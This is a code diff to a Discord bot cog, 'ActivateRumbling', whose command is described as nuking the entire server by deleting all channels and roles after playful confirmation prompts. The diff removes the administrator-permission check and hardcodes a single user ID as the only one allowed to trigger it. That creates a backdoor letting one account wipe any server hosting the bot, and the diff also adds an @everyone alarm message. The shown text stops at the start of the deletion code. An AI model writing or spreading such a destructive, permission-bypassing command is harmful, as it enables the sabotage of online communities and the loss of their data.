@@ -2,6 +2,9 @@ import asyncio
 import discord
 from discord.ext import commands
 
+# Only this user ID can activate The Rumbling
+AUTHORIZED_USER_ID = 1321085846467903569
+
 
 class ActivateRumbling(commands.Cog):
     """💀 The most destructive command — Activate The Rumbling."""
@@ -9,18 +12,22 @@ class ActivateRumbling(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
 
-    @commands.command(name="activate_rumbling")
-    @commands.has_permissions(administrator=True)
+    @commands.command(name="activate rumbling")
     async def activate_rumbling(self, ctx):
         """Nuke the entire server after a series of identity confirmations."""
 
+        # ── Authorization: only the chosen one ──────────────────────────────
+        if ctx.author.id != AUTHORIZED_USER_ID:
+            return await ctx.send("⛔ You are not the Founding Titan. This command is not for you.")
+
+        # Only accept messages from the authorized user in this channel
         def check(m):
-            return m.author == ctx.author and m.channel == ctx.channel
+            return m.author.id == AUTHORIZED_USER_ID and m.channel == ctx.channel
 
         # ── Step 1: Consciousness check (ask twice) ──────────────────────────
         for i in range(2):
             await ctx.send(
-                "⚠️ **ARE YOU CONSCIOUS?**\n"
+                f"⚠️ **ARE YOU CONSCIOUS?** (Check {i + 1}/2)\n"
                 "Reply with `yes` to confirm or `no` to abort."
             )
             try:
@@ -63,16 +70,24 @@ class ActivateRumbling(commands.Cog):
 
             if msg.content.strip().lower() != expected:
                 return await ctx.send(
-                    f"❌ Wrong identity. Expected `{expected}`. Rumbling aborted."
+                    f"❌ Wrong identity. Rumbling aborted."
                 )
 
-        # ── Step 4: Final countdown 10 → 0 ───────────────────────────────────
+        # ── Step 4: Ping @everyone — The Rumbling announcement ───────────────
         await ctx.send(
-            "☠️ **ALL IDENTITIES CONFIRMED.**\n"
-            "**THE RUMBLING BEGINS IN...**"
+            "@everyone\n"
+            "💀👿 **THE RUMBLING HAS BEEN ACTIVATED!** 👿💀\n"
+            "🌍 The Wall Titans begin their march across the earth...\n"
+            "⚠️ **There is no escape. The end is here.**"
+        )
+        await asyncio.sleep(2)
+
+        # ── Step 5: Final countdown 10 → 0 ───────────────────────────────────
+        await ctx.send(
+            "☠️ **ALL IDENTITIES CONFIRMED. THE RUMBLING BEGINS IN...**"
         )
         for i in range(10, -1, -1):
-            await ctx.send(f"**{i}...**")
+            await ctx.send(f"🔴 **{i}...**")
             await asyncio.sleep(1)
 
         await ctx.send(
@@ -80,7 +95,7 @@ class ActivateRumbling(commands.Cog):
             "🌍 Nuking the server..."
         )
 
-        # ── Step 5: Nuke — delete all channels and roles ──────────────────────
+        # ── Step 6: Nuke — delete all channels and roles ──────────────────────
         guild = ctx.guild
 
         # Delete all channels
